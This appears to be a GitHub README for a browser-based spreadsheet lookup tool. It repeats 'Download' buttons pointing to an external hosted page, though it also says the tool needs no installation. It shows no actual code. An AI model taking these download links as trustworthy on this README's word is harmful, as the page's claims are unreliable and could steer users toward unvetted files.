# Adobe Classifications Lookup Tool v2026 - browser-based lookup tool 2026

> A browser-side classification lookup utility that updates files locally in your web browser, supports common spreadsheet and delimited formats, and keeps processing on the client side.

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaac-edwards1992/classifications-lookup-tool-adobe?style=flat-square)](https://github.com/isaac-edwards1992/classifications-lookup-tool-adobe)

---

<p align="center">
  <a href="https://isaac-edwards1992.github.io/classifications-lookup-tool-adobe/">
    <img src="https://img.shields.io/badge/Download-Adobe%20Classifications%20Lookup%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download Adobe Classifications Lookup Tool">
  </a>
</p>

> **[Direct Download - Adobe Classifications Lookup Tool v2026](https://isaac-edwards1992.github.io/classifications-lookup-tool-adobe/)**

---

[Download Latest Build](https://isaac-edwards1992.github.io/classifications-lookup-tool-adobe/)

---

## Overview

Adobe Classifications Lookup Tool is a web-based file update utility that takes values from a lookup source and writes them into a target file. It is intended for fast classification-style workflows where you need to map keys to corresponding values and generate an updated output without introducing a separate backend service.

Because all processing stays on the client side, the work is handled in your browser rather than on a remote server. That makes it a good fit for spreadsheet-oriented tasks involving CSV, TSV, XLS, or XLSX files, especially when you want a lightweight local process with automatic file download at the end.

---

## Capabilities

- Fills a target file using entries from a source lookup table
- Lets you define which columns provide the matching key and the returned value
- Supports XLSX, XLS, CSV, and TSV input files
- Operates in the browser with no server installation needed
- Performs file handling and updates through client-side processing
- Includes optional treatment for rows that do not produce a match
- Downloads the processed file automatically after completion
- Works well for simple classification and data-enrichment tasks

---

## Getting Started

No classic installation step is necessary. Open the project in a compatible web browser and launch the tool from the hosted page.

If you want to run it locally from the repository, clone or download the source and serve it with any basic static web server:

- Clone: `git clone https://github.com/isaac-edwards1992/classifications-lookup-tool-adobe.git
- Open the project folder and start a local static server
- Visit the page in your browser and use the tool interface to begin

---

## How to Use

1. Open the tool in your browser.
2. Upload or select the target file you want to update.
3. Upload the source lookup table that contains the classification data.
4. Map the key column and the value column.
5. Choose how unmatched rows should be handled, if needed.
6. Run the lookup process.
7. Download the updated file when the browser finishes processing.

Example workflow:

- Source file: lookup table with classification values
- Target file: records to enrich or update
- Matching rule: compare a selected key column in both files
- Output: an updated file downloaded automatically after processing

---

## Configuration Notes

Most settings are controlled from the browser interface instead of a separate config file. Common setup decisions include:

- Source file format
- Target file format
- Key column selection
- Value column selection
- Unmatched-row handling

If you self-host the project, deployment behavior will depend on your static hosting environment and browser setup.

---

## Requirements

- A modern web browser
- Local file access for selecting input files
- Supported file types: CSV, TSV, XLS, XLSX
- Enough local memory and browser capacity for the files you upload
- Optional static hosting if you want to deploy the tool yourself

---

## FAQ

**Does it require a backend?**  
No. The tool is built to run directly in the browser without a server-side component.

**What file formats are supported?**  
It works with XLSX, XLS, CSV, and TSV files.

**Can I pick the columns used for matching?**  
Yes. You can choose the key and value columns that drive the lookup and update.

**How are unmatched rows handled?**  
The interface includes optional handling for rows that do not find a match, depending on the choices you make.

**How do I receive the output?**  
After processing finishes, the updated file is downloaded automatically.

**Where are the settings kept?**  
Configuration lives in the browser UI, so no separate install-time setup is required.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
